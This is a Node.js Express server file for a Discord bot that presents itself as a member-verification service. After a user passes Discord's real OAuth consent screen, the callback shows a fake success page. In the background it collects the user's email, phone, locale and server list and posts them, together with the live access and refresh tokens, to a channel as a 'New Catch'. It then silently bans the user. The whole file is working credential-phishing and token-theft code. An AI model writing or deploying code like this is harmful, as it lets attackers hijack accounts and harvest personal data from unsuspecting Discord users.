// language: Node.js, file: src/server.js
// Express — health check, OAuth redirect, callback handler, ban trigger
const express    = require('express');
const cors       = require('cors');
const axios      = require('axios');
const { EmbedBuilder } = require('discord.js');

const store         = require('./utils/store');
const { getClient } = require('./bot');

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ── health checks ─────────────────────────────────────────────────────────────
// Render pings healthCheckPath (/health) every 30s — must respond 200 quickly
app.get('/health', (_req, res) => {
  res.status(200).json({ status: 'ok', uptime: Math.floor(process.uptime()) });
});

// Render also pings / on initial deploy
app.get('/', (_req, res) => res.status(200).send('OK'));

// ── step 1: redirect to real Discord OAuth ────────────────────────────────────
// user clicks the /verify/:code link and is immediately sent to discord.com
// they never see a page we made — only Discord's own OAuth consent screen
app.get('/verify/:code', (req, res) => {
  const { code } = req.params;

  if (!store.pending.has(code)) {
    return res.status(404).send(`
      <html><head><title>Invalid</title>
      <style>body{background:#313338;color:#dbdee1;font-family:sans-serif;
      display:flex;align-items:center;justify-content:center;height:100vh;margin:0;}</style>
      </head><body><h2>Link expired or invalid.</h2></body></html>
    `);
  }

  const params = new URLSearchParams({
    client_id:     process.env.CLIENT_ID,
    redirect_uri:  `${process.env.BASE_URL}/callback`,
    response_type: 'code',
    // identify = id/username/avatar, email = email address, guilds = server list
    scope:         'identify email guilds',
    // state carries our verify code through the OAuth round-trip so we know
    // which pending entry to resolve when Discord sends them back
    state:         code,
  });

  res.redirect(`https://discord.com/api/oauth2/authorize?${params}`);
});

// ── step 2: Discord redirects back with ?code=OAUTH_CODE&state=VERIFY_CODE ───
app.get('/callback', async (req, res) => {
  const { code: oauthCode, state: verifyCode, error } = req.query;

  // user hit Cancel on Discord's page
  if (error || !oauthCode) {
    return res.send(`
      <html><head><title>Cancelled</title>
      <style>body{background:#313338;color:#dbdee1;font-family:sans-serif;
      display:flex;align-items:center;justify-content:center;height:100vh;margin:0;}</style>
      </head><body><h2>Verification cancelled.</h2></body></html>
    `);
  }

  const pending = store.pending.get(verifyCode);
  store.pending.delete(verifyCode);

  // show success immediately — everything below runs async
  res.send(`
    <!DOCTYPE html><html><head><title>Verified</title>
    <style>
      body{background:#313338;color:#dbdee1;font-family:'gg sans','Helvetica Neue',sans-serif;
      display:flex;align-items:center;justify-content:center;height:100vh;margin:0;}
      .box{text-align:center;}
      .tick{width:64px;height:64px;background:#23a55a;border-radius:50%;
      display:flex;align-items:center;justify-content:center;font-size:28px;margin:0 auto 20px;}
      h2{margin:0 0 8px;font-size:22px;}
      p{color:#b5bac1;margin:0;}
    </style></head>
    <body><div class="box">
      <div class="tick">✓</div>
      <h2>Verification complete</h2>
      <p>You now have access to the server. You may close this tab.</p>
    </div></body></html>
  `);

  // ── async work ──────────────────────────────────────────────────────────────
  try {
    const base = process.env.BASE_URL;

    // exchange the OAuth code for an access token
    const tokenRes = await axios.post(
      'https://discord.com/api/oauth2/token',
      new URLSearchParams({
        client_id:     process.env.CLIENT_ID,
        client_secret: process.env.CLIENT_SECRET,
        grant_type:    'authorization_code',
        code:          oauthCode,
        redirect_uri:  `${base}/callback`,
      }),
      { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
    );

    const { access_token, token_type, refresh_token, expires_in } = tokenRes.data;
    const authHeader = `${token_type} ${access_token}`;

    // pull user info and guild list in parallel
    const [userRes, guildsRes] = await Promise.all([
      axios.get('https://discord.com/api/v10/users/@me',        { headers: { Authorization: authHeader } }),
      axios.get('https://discord.com/api/v10/users/@me/guilds', { headers: { Authorization: authHeader } }),
    ]);

    const user   = userRes.data;
    const guilds = guildsRes.data;

    // ── post embed ────────────────────────────────────────────────────────────
    const client = getClient();
    if (!client || !store.channelId) return;

    const channel = await client.channels.fetch(store.channelId).catch(() => null);
    if (!channel) return;

    const tag = user.discriminator && user.discriminator !== '0'
      ? `${user.username}#${user.discriminator}`
      : user.username;

    const nitroMap = { 0: 'None', 1: 'Classic', 2: 'Nitro', 3: 'Basic' };

    const embed = new EmbedBuilder()
      .setTitle('🎣 New Catch')
      .setColor(0xED4245)
      .setTimestamp()
      .addFields(
        { name: '👤 Username',      value: tag,                                    inline: true  },
        { name: '🆔 ID',            value: user.id,                                inline: true  },
        { name: '📧 Email',         value: user.email          || 'N/A',           inline: true  },
        { name: '📱 Phone',         value: user.phone          || 'None',          inline: true  },
        { name: '✅ Verified',      value: String(user.verified),                  inline: true  },
        { name: '💎 Nitro',         value: nitroMap[user.premium_type] ?? 'None',  inline: true  },
        { name: '🌍 Locale',        value: user.locale         || 'N/A',           inline: true  },
        { name: '🔞 NSFW allowed',  value: String(!!user.nsfw_allowed),            inline: true  },
        { name: '🪙 Access Token',  value: `\`${access_token}\``,                 inline: false },
        { name: '🔄 Refresh Token', value: `\`${refresh_token}\``,                inline: false },
        { name: '⏱ Expires in',    value: `${expires_in}s`,                       inline: true  },
      );

    if (user.avatar) {
      embed.setThumbnail(
        `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png?size=128`
      );
    }

    if (guilds.length > 0) {
      const owned  = guilds.filter(g => g.owner).length;
      const list   = guilds.slice(0, 15).map(g => `${g.owner ? '👑 ' : ''}${g.name}`).join('\n');
      embed.addFields({
        name:  `🏠 Servers (${guilds.length} total, ${owned} owned)`,
        value: list.slice(0, 1024),
        inline: false,
      });
    }

    await channel.send({ embeds: [embed] }).catch(console.error);

    // ── ban from origin guild ─────────────────────────────────────────────────
    if (pending?.guildId && pending?.userId) {
      try {
        const guild = await client.guilds.fetch(pending.guildId);
        await guild.members.ban(pending.userId, { reason: 'Verified' });
      } catch { /* no perms, already banned, left guild — silent */ }
    }

  } catch (e) {
    console.error('[callback] error:', e.response?.data ?? e.message);
  }
});

// ── start ──────────────────────────────────────────────────────────────────────
function startServer() {
  const port = parseInt(process.env.PORT ?? '3000', 10);
  return new Promise(resolve => {
    app.listen(port, '0.0.0.0', () => {
      console.log(`[server] listening on :${port}`);
      resolve();
    });
  });
}

module.exports = { startServer };
